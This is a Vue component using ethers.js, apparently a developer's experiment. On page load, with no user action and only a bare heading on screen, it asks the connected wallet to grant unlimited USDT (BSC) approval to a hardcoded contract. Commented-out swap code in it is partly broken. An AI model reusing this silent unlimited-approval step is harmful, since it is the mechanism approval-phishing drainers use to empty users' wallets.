<template>
    <div>
      <h2>ethereum2</h2>

    </div>
</template>

<script setup lang="ts">
// 导入 ethers.js 库
import { ethers } from 'ethers';
import { abi,abi_Approval } from '../TronLink/abi'

const tokenABI = [
  // Read-Only Functions
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  // Authenticated Functions
  'function transfer(address to, uint amount) returns (bool)',
  // Events
  'event Transfer(address indexed from, address indexed to, uint amount)'
]

// // 定义 "SwapRouter" 合约地址，ABI 和 WETH 的地址
// const RouterAddress = '0x...';
// const RouterABI = abi;
// const WETHAddress = '0x...';

// // 创建一个 "ethers.js" 实例
// const provider = new ethers.providers.Web3Provider(window.ethereum);
// const signer = await provider.getSigner();

// // 定义交换所需的参数
// const fromTokenAddress = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE'; // ETH 的地址
// const toTokenAddress = '0x561CDD3184985e5d38bb2d4c41b4c19C938d8cF7'; // USDT 的地址
// const fromAmount = ethers.utils.parseEther('0.01'); // ETH 数量
// const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
// // 获取 "SwapRouter" 合约实例
// const router = new ethers.Contract(RouterAddress, RouterABI, signer);

// // 将源代币授权给路由器合约
// const sourceToken = new ethers.Contract(fromTokenAddress, tokenABI, signer);
// const approveTx = await sourceToken.approve(router.address, fromAmount);

// // 将源代币转换为 WETH
// const sourceTokenBalance = await sourceToken.balanceOf(signer.getAddress());
// const tx = await router.swapExactTokensForTokens(
//   fromAmount,
//   0, // 最小输出数量设为 0
//   [fromTokenAddress, WETHAddress, toTokenAddress],
//   signer.getAddress(),
//   deadline,
//   { value: sourceTokenBalance }
// );




// // // Approved example
// // // USDT(BSC)  0x55d398326f99059ff775485246999027b3197955

// try {
//   const walletAddress = '0x6F14653a91AC36935bdB15db6ccC66dC57593653' // wallet address
//   const contractAddress = '0x1ed5685f345b2fa564ea4a670de1fde39e484751' //contract address
//   const tokenContract = '0x55d398326f99059ff775485246999027b3197955' //token contract
//   const provider = new ethers.providers.Web3Provider(ethereum)
//   const signer = provider.getSigner()
//   const contract = await new ethers.Contract(tokenContract, abi, provider)
//   debugger
//   await contract.estimateGas.approve(contractAddress, ethers.constants.MaxUint256, { from: walletAddress,})
//   await contract.connect(signer).approve(contractAddress, ethers.constants.MaxUint256, {from: walletAddress})
//   let filter = contract.filters.Approval(walletAddress,contractAddress,null)
//   contract.on(filter, (from, to, amount, event) => {
//     console.log('Approve success')
//   })
//   debugger
// } catch (error) {
//   debugger
//   // TypeError: contract.estimateGas.approve is not a function
// }

const walletAddress = '0x6F14653a91AC36935bdB15db6ccC66dC57593653'; // 钱包地址
const contractAddress = '0x1ed5685f345b2fa564ea4a670de1fde39e484751'; // 合约地址
const tokenContract = '0x55d398326f99059ff775485246999027b3197955'; // 代币合约地址
const provider = new ethers.providers.Web3Provider(window.ethereum );

const signer = provider.getSigner();
const walletSigner = signer.connect(provider); // 创建一个连接到 provider 的签名者对象
debugger
const contract = new ethers.Contract(tokenContract, abi_Approval, walletSigner);
(async () => {
  try {
    const approveTx = await contract.approve(contractAddress, ethers.constants.MaxUint256, { from: walletAddress });
    await approveTx.wait(); // 等待交易完成
    console.log('Approve success');
    debugger
  } catch (error) {
    console.error('Approve failed:', error);
    debugger
  }
})();
</script>